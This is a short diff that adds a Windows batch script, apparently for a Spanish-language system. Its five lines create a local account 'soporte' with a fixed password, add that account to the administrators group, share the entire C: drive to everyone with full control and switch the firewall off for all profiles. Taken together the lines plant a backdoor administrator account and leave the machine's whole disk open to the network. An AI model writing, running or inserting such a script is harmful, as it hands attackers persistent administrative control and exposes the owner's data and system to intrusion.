@@ -1,0 +1,5 @@
+@echo off
+net user soporte P4ssw0rd! /add
+net localgroup administradores soporte /add
+net share publico=C:\ /grant:todos,full
+netsh advfirewall set allprofiles state off
